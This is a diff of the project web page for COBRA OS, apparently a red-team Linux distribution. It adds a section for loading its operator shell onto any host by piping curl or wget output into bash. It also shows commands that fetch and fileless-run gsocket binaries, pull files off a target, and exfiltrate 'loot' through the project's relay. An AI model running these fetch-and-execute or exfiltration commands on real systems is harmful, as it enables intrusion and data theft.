@@ -27,6 +27,7 @@
       <a href="#overview">overview</a>
       <a href="#features">features</a>
       <a href="#ops">ops</a>
+      <a href="#anywhere">anywhere</a>
       <a href="#relay">relay</a>
       <a href="#profiles">profiles</a>
       <a href="#build">build</a>
@@ -142,8 +143,8 @@ COBRA operator commands (cobra-ops)
       <article class="feature-card">
         <div class="feature-icon red">▲</div>
         <h3>Console-only, on purpose</h3>
-        <p>No X11, no Wayland, no DM, no GUI toolkits — the brief X11 experiment was tried and reverted.
-        A TTY is all you get, and all you need. Smaller image, smaller attack surface, nothing to phish.</p>
+        <p>No X11, no Wayland, no DM, no GUI toolkits. A TTY is all you get, and all you need.
+        Smaller image, smaller attack surface, nothing to phish.</p>
       </article>
 
       <article class="feature-card">
@@ -181,8 +182,9 @@ COBRA operator commands (cobra-ops)
         <div class="feature-icon red">⬡</div>
         <h3>De-THC'd, zero telemetry</h3>
         <p>The hackshell fork was fully audited: upstream's recon calls to <code>ip.thc.org</code> are
-        ripped out — engagement targets never leak to third-party infrastructure. Point them at your own
-        relay with <code>COBRA_RECON_HOST</code> / <code>GS_HOST</code>.</p>
+        ripped out — engagement targets never leak to third-party infrastructure. Recon and the
+        <code>gs-*</code> tools point where YOU say: <code>COBRA_RECON_HOST</code>,
+        <code>GS_HOST</code>/<code>GS_PORT</code> (<a href="#relay">our relay</a> or your own).</p>
       </article>
 
       <article class="feature-card">
@@ -275,66 +277,111 @@ COBRA operator commands (cobra-ops)
       <code>xssh</code>, <code>bounce</code>, <code>ghostip</code>, <code>hide</code>,
       <code>memexec</code>, <code>enc</code>/<code>dec</code>, <code>xtmux</code> on a hidden socket,
       paste-site exfil via <code>transfer</code>/<code>tb</code>, and the <code>gs-*</code> gsocket
-       toolset — every internet-bound one gated behind <code>xint</code>. The gsocket tools honor
-       <code>GS_HOST</code>/<code>GS_PORT</code>: point them at <a href="#relay">your own relay</a>,
-       not someone else's.</p>
+      toolset — every internet-bound one gated behind <code>xint</code>. The gsocket tools honor
+      <code>GS_HOST</code>/<code>GS_PORT</code>: rendezvous on <a href="#relay">our relay or your own</a>,
+      never someone else's. Off-OS, the same shell loads straight from this site —
+      see <a href="#anywhere">cobrashell, anywhere</a>.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ======================= SHELL ANYWHERE ======================= -->
+<section id="anywhere" class="section section-alt">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">04</span> <span class="red">></span> cobrashell, anywhere</h2>
+    <p class="sec-lede">Not booted into COBRA OS? The operator shell is mirrored on this site — pull it
+    onto any Linux box (HTB, VulnHub, a jumped host) and the toolkit comes with you. Same file the OS
+    sources at <code>/etc/cobra/cobrashell.sh</code>, served byte-for-byte from this repo.</p>
+    <div class="build-grid">
+      <div class="build-step">
+        <h3><span class="step-num">1</span> load it</h3>
+        <pre class="codeblock"><code><span class="t-dim"># straight into your running bash:</span>
+source &lt;(curl -fsSL https://cobra-os.com/shell/cobrashell.sh)
+
+<span class="t-dim"># or the short URL (same file):</span>
+source &lt;(curl -fsSL https://cobra-os.com/cobrashell.sh)
+
+<span class="t-dim"># no curl? wget works too:</span>
+source &lt;(wget -qO- https://cobra-os.com/shell/cobrashell.sh)</code></pre>
+        <p>Nothing is written to disk — <code>XHOME</code> still lives in <code>/dev/shm</code> and
+        auto-destructs on exit, history still goes to <code>/dev/null</code>, and the <code>xint</code>
+        gate still stands between the box and the internet.</p>
+      </div>
+      <div class="build-step">
+        <h3><span class="step-num">2</span> grab the helpers</h3>
+        <pre class="codeblock"><code><span class="t-dim"># the vendored tools cobrashell calls are mirrored too:</span>
+curl -fsSLO https://cobra-os.com/shell/ghostip.sh
+curl -fsSLO https://cobra-os.com/shell/whatserver.sh
+curl -fsSLO https://cobra-os.com/shell/mkegg.sh
+curl -fsSLO https://cobra-os.com/shell/linpeas.sh
+
+<span class="t-dim"># then the usual:</span>
+xint                <span class="t-dim"># allow internet egress</span>
+bin gs-netcat       <span class="t-dim"># pulled from OUR infra (next section)</span></code></pre>
+        <p>On COBRA OS these live at <code>/etc/cobra/</code> and need no network. Everywhere else, fetch
+        what you need — deliberate, operator-summoned, over HTTPS from this domain only.</p>
+      </div>
+    </div>
+    <div class="callout callout-amber">
+      <strong>trust the path:</strong> the mirror deploys from this repo with the site — and the
+      curl-pipe-bash rule still applies: read it first
+      (<code>curl -fsSL https://cobra-os.com/shell/cobrashell.sh | less</code>), then load it.
     </div>
   </div>
 </section>
 
 <!-- ======================= RELAY ======================= -->
-<section id="relay" class="section section-alt">
+<section id="relay" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">04</span> <span class="red">></span> your own relay — gsocket, self-hosted</h2>
+    <h2 class="sec-title"><span class="sec-num">05</span> <span class="red">></span> gsocket — from our infra</h2>
     <p class="sec-lede">cobrashell's <code>gs-*</code> toolset (gs-netcat, gs-sftp, gs-exfil) rendezvous
-    through the Global Socket Relay Network by default. COBRA OS is de-THC'd — nothing calls home to
-    THC infrastructure — and for full independence you point the tools at a relay you own: the
-    <a href="https://github.com/hackerschoice/gsocket">hackerschoice/gsocket</a> project ships the
-    relay daemon.</p>
+    through a relay: both ends connect <em>outbound</em>, streams are end-to-end encrypted (SRP), and the
+    relay only ever sees ciphertext. COBRA runs its own corner of that network — the binaries and the
+    relay come from infrastructure we control, not THC's.</p>
     <div class="build-grid">
       <div class="build-step">
-        <h3><span class="step-num">1</span> run the relay</h3>
-        <pre class="codeblock"><code><span class="t-dim"># on a VPS you control (e.g. relay.cobra-os.com)</span>
-<span class="t-dim"># docker — the published relay image:</span>
-docker run -d --restart unless-stopped \
-    -p 7350:7350 hackerschoice/gsocket-relay
+        <h3><span class="step-num">1</span> binaries from cobra-os.com</h3>
+        <pre class="codeblock"><code><span class="t-dim"># inside cobrashell, on any box:</span>
+xint
+bin gs-netcat     <span class="t-dim"># → dl.cobra-os.com/bin/gs-netcat_linux-x86_64</span>
 
-<span class="t-dim"># or the relay daemon from the gsocket repo:</span>
-gsocket -s          <span class="t-dim"># listens on TCP/7350</span></code></pre>
-        <p>One TCP port; both ends connect <em>outbound</em> to the relay, so NAT and the
-        default-deny firewall are never a problem. Streams are end-to-end encrypted (SRP) — the
-        relay only ever sees ciphertext. Deploy notes & hardening: the gsocket repo.</p>
+<span class="t-dim"># or directly / fileless:</span>
+curl -fsSLO https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64
+memexec https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64</code></pre>
+        <p>Static upstream builds, mirrored byte-for-byte with <code>.sha256</code> sidecars on the same
+        R2 bucket that ships the ISOs. No GitHub rate limits, no third-party fetch path mid-op.</p>
       </div>
       <div class="build-step">
-        <h3><span class="step-num">2</span> point COBRA OS at it</h3>
-        <pre class="codeblock"><code><span class="t-dim"># in the operator shell, before any gs-* work:</span>
+        <h3><span class="step-num">2</span> rendezvous on our relay</h3>
+        <pre class="codeblock"><code><span class="t-dim"># point the gs-* tools at the COBRA relay:</span>
 export GS_HOST=relay.cobra-os.com
 export GS_PORT=7350
 xint
 
-<span class="t-dim"># everything gsocket now rides YOUR relay:</span>
 gs-sftp-server            <span class="t-dim"># browse/pull files off a target</span>
 gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <span class="t-dim"># the egg wizard's gs-netcat beacon mode threads</span>
 <span class="t-dim"># GS_HOST/GS_PORT into the payload too</span></code></pre>
-        <p>Same pattern for recon: <code>COBRA_RECON_HOST</code> points cobrashell's
-        <code>sub</code>/<code>ptr</code> at your own recon service (upstream's
-        <code>ip.thc.org</code> calls are ripped out). All of it stays behind the
-        <code>xint</code> gate.</p>
+        <p>A small VPS we control — spinning up alongside a <code>.onion</code> address for Tor access.
+        Until it's live, the tools default to the public relay network and need no env vars. Want full
+        independence either way? Run your own —
+        <code>docker run -d -p 7350:7350 hackerschoice/gsocket-relay</code>.</p>
       </div>
     </div>
     <div class="callout callout-amber">
-      <strong>why bother:</strong> the gsocket stream is end-to-end encrypted on any relay — but
-      your own relay also keeps connection metadata (timing, volume, pairings) on infrastructure
-      you control, and a burned public relay can never take your access with it.
+      <strong>why bother:</strong> the stream is end-to-end encrypted on any relay — whose relay you use
+      decides who sees connection metadata (timing, volume, pairings), and a burned public relay can
+      never take your access with it. Same pattern for recon: <code>COBRA_RECON_HOST</code> points
+      <code>sub</code>/<code>ptr</code> at your own service (upstream's <code>ip.thc.org</code> calls
+      are ripped out). All of it stays behind the <code>xint</code> gate.
     </div>
   </div>
 </section>
 
 <!-- ======================= PROFILES ======================= -->
-<section id="profiles" class="section">
+<section id="profiles" class="section section-alt">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">05</span> <span class="red">></span> build profiles</h2>
+    <h2 class="sec-title"><span class="sec-num">06</span> <span class="red">></span> build profiles</h2>
     <p class="sec-lede">The core stays narrow. Extras ride in as space-separated
     <code>COBRA_PROFILES</code> at build time — each one a case in <code>chroot-setup.sh</code>, never
     part of the core list.</p>
@@ -353,7 +400,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
         <h3><span class="red">[</span> exploit <span class="red">]</span></h3>
         <p class="profile-pkgs">metasploit-framework</p>
         <p>msfconsole is a TTY native. The local exploit-db archive (searchsploit →
-        <code>sploit</code>) is core since 2026-08-17 — this profile is just the framework.</p>
+        <code>sploit</code>) is core — this profile is just the framework.</p>
       </article>
       <article class="profile-card">
         <h3><span class="red">[</span> webplus <span class="red">]</span></h3>
@@ -368,7 +415,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <!-- ======================= HARDENING ======================= -->
 <section id="hardening" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">06</span> <span class="red">></span> hardened by default</h2>
+    <h2 class="sec-title"><span class="sec-num">07</span> <span class="red">></span> hardened by default</h2>
     <div class="harden-grid">
       <ul class="harden-list">
         <li><span class="h-k">root</span> locked (<code>passwd -l</code>) — sudo-only via the <code>operator</code> user, password change forced on first login</li>
@@ -389,7 +436,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <!-- ======================= BUILD ======================= -->
 <section id="build" class="section section-alt">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">07</span> <span class="red">></span> build it yourself</h2>
+    <h2 class="sec-title"><span class="sec-num">08</span> <span class="red">></span> build it yourself</h2>
     <p class="sec-lede">Two host-side scripts do everything. debootstrap wants root, so run them on a
     Debian/Ubuntu host or VM.</p>
     <div class="build-grid">
@@ -430,7 +477,7 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
 <!-- ======================= DOWNLOAD ======================= -->
 <section id="download" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">08</span> <span class="red">></span> get the build</h2>
+    <h2 class="sec-title"><span class="sec-num">09</span> <span class="red">></span> get the build</h2>
     <div class="dl-grid">
       <div class="dl-card">
         <h3 class="dl-title">cobra-os-20260816.iso</h3>
@@ -445,11 +492,9 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
           <a class="btn btn-red" href="https://dl.cobra-os.com/cobra-os-20260816.iso">download iso</a>
           <a class="btn btn-ghost" href="downloads/cobra-os-20260816.iso.sha256" download>sha256</a>
         </div>
-        <p class="dl-note">Hosted on Cloudflare R2 at <code>dl.cobra-os.com</code> — Pages caps files at
-        25&nbsp;MiB and GitHub Releases at 2&nbsp;GiB, so the 2.4&nbsp;GiB ISO ships from the bucket.
-        The <code>.sha256</code> is mirrored there and versioned here in <code>downloads/</code>.
-        New builds: <code>website/release.sh</code> + <code>rclone</code> (see
-        <code>website/README.md</code>).</p>
+        <p class="dl-note">Builds ship from <code>dl.cobra-os.com</code> (Cloudflare R2 — Pages caps
+        files at 25&nbsp;MiB). The <code>.sha256</code> is mirrored there and versioned in
+        <code>downloads/</code>.</p>
       </div>
       <div class="dl-verify">
         <h3>verify, then write</h3>
@@ -475,30 +520,6 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-20260816.iso</code></pre>
   </div>
 </section>
 
-<!-- ======================= THEME ======================= -->
-<section id="theme" class="section section-alt">
-  <div class="container">
-    <h2 class="sec-title"><span class="sec-num">09</span> <span class="red">></span> the cobra palette</h2>
-    <p class="sec-lede">Red-team cyberpunk with zero packages and zero X — the same ramp that themes the
-    boot menu, the login banner, the console, and this page.</p>
-    <div class="palette">
-      <div class="swatch" style="--sw:#050508"><span class="sw-name">void</span><span class="sw-hex">#050508</span></div>
-      <div class="swatch" style="--sw:#d6dbe2"><span class="sw-name">steel</span><span class="sw-hex">#d6dbe2</span></div>
-      <div class="swatch" style="--sw:#ff2a3c"><span class="sw-name">neon red</span><span class="sw-hex">#ff2a3c</span></div>
-      <div class="swatch" style="--sw:#3dff8f"><span class="sw-name">phosphor</span><span class="sw-hex">#3dff8f</span></div>
-      <div class="swatch" style="--sw:#ffb84d"><span class="sw-name">amber</span><span class="sw-hex">#ffb84d</span></div>
-      <div class="swatch" style="--sw:#4d7cff"><span class="sw-name">electric</span><span class="sw-hex">#4d7cff</span></div>
-      <div class="swatch" style="--sw:#c95cff"><span class="sw-name">violet</span><span class="sw-hex">#c95cff</span></div>
-      <div class="swatch" style="--sw:#2ee6e6"><span class="sw-name">cyan</span><span class="sw-hex">#2ee6e6</span></div>
-      <div class="swatch" style="--sw:#3a3f4a"><span class="sw-name">gunmetal</span><span class="sw-hex">#3a3f4a</span></div>
-    </div>
-    <div class="splash-showcase">
-      <img src="assets/img/splash.png" alt="COBRA OS boot splash — cobra on black, vesamenu-safe" loading="lazy">
-      <p class="splash-caption">the actual boot splash — <code>splash.png</code>, flattened for vesamenu, backing both the isolinux (BIOS) and GRUB (UEFI) menus.</p>
-    </div>
-  </div>
-</section>
-
 </main>
 
 <!-- ======================= FOOTER ======================= -->
@@ -514,6 +535,7 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-20260816.iso</code></pre>
       <a href="#overview">overview</a>
       <a href="#features">features</a>
       <a href="#ops">ops registry</a>
+      <a href="#anywhere">shell anywhere</a>
       <a href="#relay">relay</a>
       <a href="#build">build</a>
       <a href="#download">download</a>
